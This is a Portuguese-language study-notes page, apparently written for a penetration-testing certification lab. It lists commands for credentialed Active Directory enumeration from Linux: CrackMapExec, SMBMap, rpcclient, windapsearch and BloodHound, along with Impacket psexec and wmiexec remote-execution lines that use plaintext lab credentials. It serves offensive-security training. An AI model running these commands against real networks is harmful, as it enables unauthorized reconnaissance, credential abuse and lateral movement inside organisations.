> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/active-directory-enumeration-and-attacks/credentialed-enumeration-from-linux.md).

# Credentialed Enumeration - from Linux

**CrackMapExec**

* **CME - Enumeração de Usuários de Domínio**

```sh
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

* **CME - Enumeração de Grupo de Domínio**

```sh
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

* **CME - Usuários conectados**

```sh
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

* **Enumeração de compartilhamento - Controlador de domínio**

```sh
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

* **Spider\_plus**

```sh
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

**SMBMap**

* **SMBMap para verificar o acesso**

```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

* **Lista recursiva de todos os diretórios**

```sh
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

**rpcclient**

```sh
rpcclient -U "" -N 172.16.5.5
```

* **RPCClient User Enumeration By RID**

`queryuser 0x457`

* **Enumdomusers**

`enumdomusers`

**Impacket Toolkit**

* **Usando psexec.py**

```sh
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.130  
```

* **Usando wmiexec.py**

```sh
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.130
```

**Windapsearch**

* **Windapsearch - Administradores de domínio**

```sh
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

* **Windapsearch - Usuários Privilegiados**

```sh
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

**Bloodhound.py**

* **Executando BloodHound.py**

```sh
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```

* **Carregue o arquivo Zip na GUI do BloodHound**

```sh
sudo neo4j start
```

* Digitar `bloodhound`
* Compactar os arquivos, ao invés de carregá-los um por um

```
zip -r ilfreight_bh.zip *.json
```

#### **Outros**&#x20;

[Folha de dicas interativa](https://wadcoms.github.io/) - **WADComs**
